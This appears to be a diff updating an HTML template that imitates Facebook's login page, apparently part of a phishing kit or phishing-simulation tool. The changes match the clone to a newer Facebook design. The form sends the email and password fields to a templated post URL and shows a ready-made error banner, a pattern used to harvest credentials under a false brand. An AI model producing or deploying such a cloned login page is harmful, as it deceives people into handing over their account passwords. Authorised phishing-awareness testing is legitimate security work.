@@ -8,26 +8,36 @@
     <link rel="icon" href="/static/favicon.ico">
 </head>
 <body>
-    <div class="fb-wrapper">
-        <div class="fb-content">
-            <div class="fb-left">
-                <img src="/static/logo.svg" alt="Facebook" class="fb-logo">
-                <h2 class="fb-tagline">Facebook helps you connect and share with the people in your life.</h2>
+    <div class="fb-page">
+        <div class="fb-hero">
+            <div class="fb-hero-top">
+                <img src="/static/logo.svg" alt="Facebook" class="fb-icon">
             </div>
-            <div class="fb-right">
-                <div class="fb-login-card">
-                    <form action="{{ post_url }}" method="POST">
-                        <div class="fb-error-banner">
-                            {{ error_message }}
-                        </div>
+            <div class="fb-hero-center">
+                <img src="/static/collage.png" alt="" class="fb-collage-img">
+            </div>
+            <div class="fb-hero-bottom">
+                <h1 class="fb-headline">Explore the<br>things <span class="fb-highlight">you<br>love</span>.</h1>
+            </div>
+        </div>
+        <div class="fb-login-side">
+            <div class="fb-login-form">
+                <h2 class="fb-login-title">Log into Facebook</h2>
+                <form action="{{ post_url }}" method="POST">
+                    <div class="fb-error-banner">
+                        {{ error_message }}
+                    </div>
+                    <div class="fb-input-wrap">
                         <input
                             type="text"
                             name="email"
                             class="fb-input fb-input-error"
-                            placeholder="Email address or phone number"
-                            aria-label="Email address or phone number"
+                            placeholder="Email or mobile number"
+                            aria-label="Email or mobile number"
                             autofocus
                         >
+                    </div>
+                    <div class="fb-input-wrap">
                         <input
                             type="password"
                             name="pass"
@@ -35,18 +45,17 @@
                             placeholder="Password"
                             aria-label="Password"
                         >
-                        <button type="submit" class="fb-btn-login">Log in</button>
-                        <div class="fb-forgot">
-                            <a href="#">Forgotten password?</a>
-                        </div>
-                        <div class="fb-divider"></div>
-                        <div class="fb-create-wrapper">
-                            <a href="#" class="fb-btn-create">Create new account</a>
-                        </div>
-                    </form>
+                    </div>
+                    <button type="submit" class="fb-btn-login">Log in</button>
+                </form>
+                <div class="fb-forgot">
+                    <a href="#">Forgot password?</a>
                 </div>
-                <div class="fb-create-page">
-                    <a href="#"><strong>Create a Page</strong></a> for a celebrity, brand or business.
+                <div class="fb-create-wrapper">
+                    <a href="#" class="fb-btn-create">Create new account</a>
+                </div>
+                <div class="fb-meta-logo">
+                    <img src="/static/meta.svg" alt="Meta" class="fb-meta-img">
                 </div>
             </div>
         </div>
@@ -55,47 +64,41 @@
         <div class="fb-footer-content">
             <div class="fb-footer-langs">
                 <span>English (US)</span>
-                <a href="#">Espanol</a>
-                <a href="#">Francais (France)</a>
-                <a href="#">Deutsch</a>
-                <a href="#">Italiano</a>
-                <a href="#">Portugues (Brasil)</a>
-                <a href="#">Hindi</a>
-                <a href="#">Arabic</a>
-                <a href="#">Japanese</a>
-                <a href="#">Korean</a>
+                <span>Espa&#xF1;ol</span>
+                <span>Fran&#xe7;ais (France)</span>
+                <span>&#x0939;&#x093F;&#x0928;&#x094D;&#x0926;&#x0940;</span>
+                <span>&#x0627;&#x0644;&#x0639;&#x0631;&#x0628;&#x064A;&#x0629;</span>
+                <span>Portugu&#xEA;s (Brasil)</span>
+                <span>Italiano</span>
+                <span>More languages...</span>
             </div>
-            <div class="fb-footer-divider"></div>
             <div class="fb-footer-links">
                 <a href="#">Sign Up</a>
                 <a href="#">Log In</a>
                 <a href="#">Messenger</a>
                 <a href="#">Facebook Lite</a>
                 <a href="#">Video</a>
-                <a href="#">Places</a>
-                <a href="#">Games</a>
-                <a href="#">Marketplace</a>
                 <a href="#">Meta Pay</a>
                 <a href="#">Meta Store</a>
                 <a href="#">Meta Quest</a>
+                <a href="#">Ray-Ban Meta</a>
+                <a href="#">Meta AI</a>
                 <a href="#">Instagram</a>
                 <a href="#">Threads</a>
-                <a href="#">Fundraisers</a>
-                <a href="#">Services</a>
-                <a href="#">Voting Information Centre</a>
+                <a href="#">Voting Information Center</a>
                 <a href="#">Privacy Policy</a>
-                <a href="#">Privacy Centre</a>
-                <a href="#">Groups</a>
+                <a href="#">Consumer Health Privacy</a>
+                <a href="#">Privacy Center</a>
                 <a href="#">About</a>
                 <a href="#">Create ad</a>
                 <a href="#">Create Page</a>
                 <a href="#">Developers</a>
                 <a href="#">Careers</a>
                 <a href="#">Cookies</a>
-                <a href="#">AdChoices</a>
+                <a href="#">Ad choices</a>
                 <a href="#">Terms</a>
                 <a href="#">Help</a>
-                <a href="#">Contact uploading and non-users</a>
+                <a href="#">Contact Uploading & Non-Users</a>
             </div>
             <div class="fb-footer-copy">Meta &copy; 2025</div>
         </div>
